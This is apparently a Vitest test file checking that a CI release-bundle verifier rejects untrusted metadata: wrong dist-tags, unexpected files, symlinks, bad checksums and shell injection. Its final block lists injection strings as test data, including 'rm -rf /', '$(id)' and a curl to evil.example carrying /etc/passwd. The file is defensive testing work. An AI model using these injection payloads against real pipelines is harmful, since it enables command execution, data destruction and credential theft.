import { createHash } from "node:crypto";
import { describe, expect, it } from "vitest";
import { packedTarballName, verifyReleaseBundle } from "../../scripts/release-bundle-contract.mjs";

/**
 * The publish job holds `id-token: write`; the bundle it consumes is built by a job that ran
 * dependency and package lifecycle scripts. Everything here is about not trusting that bundle.
 *
 * Two real defects are pinned as tests. The verifier used to print `export KEY='value'` for the
 * workflow to `eval`, so a `distTag` of `next'; touch /tmp/PWNED; echo '` executed in the
 * privileged job. And the dist-tag, tag, and tarball name were read *from* the bundle, so a
 * `prepare` job could have published a beta to `latest`.
 */

const SDK_VERSION = "0.1.0-beta.2";
const CLI_VERSION = "0.1.0-beta.1";
const COMMIT = "960146d44258d635d97e235770d4e4eb010e5435";

const bytes = new TextEncoder().encode("tarball-bytes");
const digest = (input: Uint8Array) => ({
  sha1: createHash("sha1").update(input).digest("hex"),
  sha256: createHash("sha256").update(input).digest("hex"),
  integrity: `sha512-${createHash("sha512").update(input).digest("base64")}`,
});
const DIGESTS = digest(bytes);

type Bundle = Record<string, string>;

function sdkBundle(overrides: Partial<Record<string, unknown>> = {}, files?: Bundle) {
  const tarball = packedTarballName("@fairux/sdk", SDK_VERSION);
  const metadata = {
    package: "@fairux/sdk",
    version: SDK_VERSION,
    spec: `@fairux/sdk@${SDK_VERSION}`,
    distTag: "next",
    ...DIGESTS,
    tag: `sdk-v${SDK_VERSION}`,
    commit: COMMIT,
    tarball,
    ...overrides,
  };
  return {
    tarball,
    files: files ?? {
      [tarball]: "",
      "release-sha256.txt": `${DIGESTS.sha256}  ${tarball}\n`,
      "release-metadata.json": JSON.stringify(metadata),
    },
  };
}

/** Bundle entries as the verifier reports them: every name paired with its filesystem kind. */
const asFiles = (files: Bundle) =>
  Object.keys(files).map((name) => ({ name, kind: "file" as const }));

function verifySdk(
  bundle: { tarball: string; files: Bundle },
  tag = `sdk-v${SDK_VERSION}`,
  entries = asFiles(bundle.files),
) {
  return verifyReleaseBundle({
    kind: "sdk",
    tag,
    commit: COMMIT,
    manifest: { name: "@fairux/sdk", version: SDK_VERSION },
    entries,
    readText: (name) => bundle.files[name],
    readBytes: () => bytes,
    digest,
  });
}

describe("release bundle — happy paths", () => {
  it("accepts a well-formed SDK bundle and derives the release identity", () => {
    expect(verifySdk(sdkBundle())).toEqual({
      tarball: "fairux-sdk-0.1.0-beta.2.tgz",
      version: SDK_VERSION,
      spec: `@fairux/sdk@${SDK_VERSION}`,
      distTag: "next",
      ...DIGESTS,
    });
  });

  it("accepts a well-formed CLI bundle, whose checksum file has the same name as the SDK's", () => {
    // The CLI bundle used to be written as `tarball-sha256.txt` while the verifier read
    // `fairux-sdk-sha256.txt`, so the first CLI release would have failed at this step.
    const tarball = packedTarballName("fairux", CLI_VERSION);
    const files: Bundle = {
      [tarball]: "",
      "release-sha256.txt": `${DIGESTS.sha256}  ${tarball}\n`,
      "release-metadata.json": JSON.stringify({
        package: "fairux",
        version: CLI_VERSION,
        spec: `fairux@${CLI_VERSION}`,
        distTag: "next",
        ...DIGESTS,
        tag: `v${CLI_VERSION}`,
        commit: COMMIT,
        tarball,
      }),
    };
    const verified = verifyReleaseBundle({
      kind: "cli",
      tag: `v${CLI_VERSION}`,
      commit: COMMIT,
      manifest: { name: "fairux", version: CLI_VERSION },
      entries: asFiles(files),
      readText: (name) => files[name],
      readBytes: () => bytes,
      digest,
    });
    expect(verified.distTag).toBe("next");
    expect(verified.tarball).toBe("fairux-0.1.0-beta.1.tgz");
  });

  it("derives the packed filename rather than reading it", () => {
    expect(packedTarballName("@fairux/sdk", "0.1.0-beta.2")).toBe("fairux-sdk-0.1.0-beta.2.tgz");
    expect(packedTarballName("fairux", "1.2.3")).toBe("fairux-1.2.3.tgz");
  });
});

describe("release bundle — the bundle may not decide policy", () => {
  it("refuses an SDK bundle claiming the latest dist-tag", () => {
    expect(() => verifySdk(sdkBundle({ distTag: "latest" }))).toThrow(/distTag/);
  });

  it("derives the dist-tag from the manifest version, not the metadata", () => {
    // CLI policy: prerelease → next, stable → latest.
    const stable = "1.0.0";
    const tarball = packedTarballName("fairux", stable);
    const files: Bundle = {
      [tarball]: "",
      "release-sha256.txt": `${DIGESTS.sha256}  ${tarball}\n`,
      "release-metadata.json": JSON.stringify({
        package: "fairux",
        version: stable,
        spec: `fairux@${stable}`,
        distTag: "next", // wrong for a stable version
        ...DIGESTS,
        tag: `v${stable}`,
        commit: COMMIT,
        tarball,
      }),
    };
    expect(() =>
      verifyReleaseBundle({
        kind: "cli",
        tag: `v${stable}`,
        commit: COMMIT,
        manifest: { name: "fairux", version: stable },
        entries: asFiles(files),
        readText: (name) => files[name],
        readBytes: () => bytes,
        digest,
      }),
    ).toThrow(/distTag/);
  });

  it("refuses a stable SDK version outright, since the workflow is beta-only", () => {
    expect(() =>
      verifyReleaseBundle({
        kind: "sdk",
        tag: "sdk-v1.0.0",
        commit: COMMIT,
        manifest: { name: "@fairux/sdk", version: "1.0.0" },
        entries: [],
        readText: () => "",
        readBytes: () => bytes,
        digest,
      }),
    ).toThrow(/beta-only/);
  });

  it("refuses a tag that does not match the manifest version", () => {
    expect(() => verifySdk(sdkBundle(), "sdk-v0.1.0-beta.9")).toThrow(
      /does not match the manifest/,
    );
  });

  it.each([
    ["package", { package: "evil-package" }],
    ["spec", { spec: "@fairux/sdk@9.9.9" }],
    ["commit", { commit: "0000000000000000000000000000000000000000" }],
    ["tag", { tag: "sdk-v9.9.9" }],
    ["tarball", { tarball: "fairux-sdk-9.9.9.tgz" }],
    ["sha256", { sha256: "0".repeat(64) }],
    ["sha1", { sha1: "0".repeat(40) }],
    ["integrity", { integrity: "sha512-000" }],
  ])("refuses a bundle whose %s disagrees with the checkout", (_label, override) => {
    expect(() => verifySdk(sdkBundle(override))).toThrow();
  });

  it("refuses unknown metadata keys rather than ignoring them", () => {
    expect(() => verifySdk(sdkBundle({ extra: "surprise" }))).toThrow(/unexpected keys/);
  });
});

describe("release bundle — the file set is exact", () => {
  it("refuses an extra file", () => {
    const bundle = sdkBundle();
    bundle.files["EVIL.txt"] = "x";
    expect(() => verifySdk(bundle)).toThrow(/bundle contents do not match/);
  });

  it("refuses a missing file", () => {
    const bundle = sdkBundle();
    delete bundle.files["release-metadata.json"];
    expect(() => verifySdk(bundle)).toThrow(/bundle contents do not match/);
  });

  it("refuses release notes riding along in the bundle", () => {
    // Notes became the GitHub Release body, so an unprivileged job's prose was published as if the
    // repository had written it. They are generated in the publish job now, from its own checkout.
    const bundle = sdkBundle();
    bundle.files["sdk-release-notes.md"] = "# Owned\n";
    expect(() => verifySdk(bundle)).toThrow(/bundle contents do not match/);
  });

  it("refuses a tarball named for a different version", () => {
    const bundle = sdkBundle();
    const wrong = "fairux-sdk-0.1.0-beta.2-extra.tgz";
    bundle.files[wrong] = bundle.files[bundle.tarball];
    delete bundle.files[bundle.tarball];
    expect(() => verifySdk(bundle)).toThrow(/bundle contents do not match/);
  });
});

describe("release bundle — every entry must be a regular file", () => {
  // The verifier used to *filter* the directory listing down to regular files, so a bundle could
  // carry a directory tree or a symlink alongside the three expected names and still verify.
  it.each(["directory", "symlink", "other"] as const)("refuses a %s entry", (kind) => {
    const bundle = sdkBundle();
    expect(() =>
      verifySdk(bundle, `sdk-v${SDK_VERSION}`, [
        ...asFiles(bundle.files),
        { name: "payload", kind },
      ]),
    ).toThrow(/not regular files/);
  });

  it("refuses a symlink standing in for an expected file", () => {
    const bundle = sdkBundle();
    const entries = asFiles(bundle.files).map((entry) =>
      entry.name === "release-metadata.json"
        ? { name: entry.name, kind: "symlink" as const }
        : entry,
    );
    expect(() => verifySdk(bundle, `sdk-v${SDK_VERSION}`, entries)).toThrow(/not regular files/);
  });

  it("names every irregular entry rather than only the first", () => {
    const bundle = sdkBundle();
    let message = "";
    try {
      verifySdk(bundle, `sdk-v${SDK_VERSION}`, [
        { name: "a", kind: "directory" },
        { name: "b", kind: "symlink" },
      ]);
    } catch (error) {
      message = (error as Error).message;
    }
    expect(message).toContain("a, b");
  });
});

describe("release bundle — version policy is strict SemVer", () => {
  it("treats a numeric prerelease as a prerelease", () => {
    // `1.0.0-1` is a prerelease under SemVer. The old `/-[a-zA-Z]/` test called it stable, which
    // for the CLI meant `latest` and for the SDK meant refusing a version it should have accepted.
    const version = "1.0.0-1";
    const tarball = packedTarballName("fairux", version);
    const files: Bundle = {
      [tarball]: "",
      "release-sha256.txt": `${DIGESTS.sha256}  ${tarball}\n`,
      "release-metadata.json": JSON.stringify({
        package: "fairux",
        version,
        spec: `fairux@${version}`,
        distTag: "next",
        ...DIGESTS,
        tag: `v${version}`,
        commit: COMMIT,
        tarball,
      }),
    };
    expect(
      verifyReleaseBundle({
        kind: "cli",
        tag: `v${version}`,
        commit: COMMIT,
        manifest: { name: "fairux", version },
        entries: asFiles(files),
        readText: (name) => files[name],
        readBytes: () => bytes,
        digest,
      }).distTag,
    ).toBe("next");
  });

  it("accepts a numeric-prerelease SDK version, which the old test refused", () => {
    const version = "1.0.0-1";
    const tarball = packedTarballName("@fairux/sdk", version);
    const files: Bundle = {
      [tarball]: "",
      "release-sha256.txt": `${DIGESTS.sha256}  ${tarball}\n`,
      "release-metadata.json": JSON.stringify({
        package: "@fairux/sdk",
        version,
        spec: `@fairux/sdk@${version}`,
        distTag: "next",
        ...DIGESTS,
        tag: `sdk-v${version}`,
        commit: COMMIT,
        tarball,
      }),
    };
    expect(
      verifyReleaseBundle({
        kind: "sdk",
        tag: `sdk-v${version}`,
        commit: COMMIT,
        manifest: { name: "@fairux/sdk", version },
        entries: asFiles(files),
        readText: (name) => files[name],
        readBytes: () => bytes,
        digest,
      }).distTag,
    ).toBe("next");
  });

  it.each(["1.0", "v1.0.0", "1.0.0.0", "01.0.0", ""])(
    "refuses a manifest version that is not SemVer: %j",
    (version) => {
      expect(() =>
        verifyReleaseBundle({
          kind: "cli",
          tag: `v${version}`,
          commit: COMMIT,
          manifest: { name: "fairux", version },
          entries: [],
          readText: () => "",
          readBytes: () => bytes,
          digest,
        }),
      ).toThrow(/not valid SemVer/);
    },
  );
});

describe("release bundle — the checksum line is exact", () => {
  it.each([
    ["a wrong hash", `${"0".repeat(64)}  fairux-sdk-0.1.0-beta.2.tgz\n`],
    ["a right hash under a wrong name", `${DIGESTS.sha256}  other.tgz\n`],
    ["a single space", `${DIGESTS.sha256} fairux-sdk-0.1.0-beta.2.tgz\n`],
    ["no trailing newline", `${DIGESTS.sha256}  fairux-sdk-0.1.0-beta.2.tgz`],
    ["the hash inside a comment", `# ${DIGESTS.sha256}  fairux-sdk-0.1.0-beta.2.tgz\n`],
    ["an empty file", ""],
  ])("refuses %s", (_label, checksum) => {
    const bundle = sdkBundle();
    bundle.files["release-sha256.txt"] = checksum;
    expect(() => verifySdk(bundle)).toThrow(/release-sha256\.txt/);
  });
});

describe("release bundle — no value may become shell", () => {
  it("refuses the exact payload that executed in the privileged job", () => {
    // Reproduced against the previous implementation: this `distTag`, passed through
    // `export DIST_TAG='…'` and `eval`, created a marker file in the job holding id-token: write.
    expect(() => verifySdk(sdkBundle({ distTag: "next'; touch /tmp/PWNED; echo '" }))).toThrow();
  });

  it.each([
    "next'; rm -rf /; echo '",
    'next"; whoami; echo "',
    "next\n export EVIL=1",
    "next`id`",
    "next$(id)",
    "next\\; id",
  ])("refuses a shell-bearing dist-tag: %j", (distTag) => {
    expect(() => verifySdk(sdkBundle({ distTag }))).toThrow();
  });

  it("returns only values free of quotes, newlines, and expansion characters", () => {
    for (const value of Object.values(verifySdk(sdkBundle()))) {
      expect(value).not.toMatch(/["'`$\\\r\n\0]/);
    }
  });

  it("does not echo a rejected value back in the message", () => {
    const secret = "next'; curl evil.example/$(cat /etc/passwd); echo '";
    let message = "";
    try {
      verifySdk(sdkBundle({ distTag: secret }));
    } catch (error) {
      message = (error as Error).message;
    }
    expect(message).not.toContain("curl evil.example");
  });
});
